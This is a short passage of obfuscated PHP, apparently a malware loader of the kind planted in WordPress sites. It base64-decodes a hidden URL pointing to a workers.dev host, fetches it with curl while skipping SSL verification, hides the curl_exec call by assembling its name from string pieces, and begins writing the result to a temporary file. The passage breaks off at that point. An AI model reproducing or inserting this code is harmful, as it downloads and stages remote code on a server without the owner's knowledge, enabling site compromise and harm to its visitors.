...
$_u = base64_decode('aHR0cHM6Ly9yYXctc2VydmUubmlicmFzLXN1YWQud29ya2Vycy5kZXYvd3AtbG9ncy5waHA=');
$_c = curl_init($_u);
curl_setopt_array($_c, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_TIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => 0]);
$_xe = implode('', ['cu', 'rl_', 'ex', 'ec']);
$_d = $_xe($_c);
if (!curl_errno($_c) && strlen($_d) > 0) {
	$_t = tempnam(sys_get_temp_dir(), '');
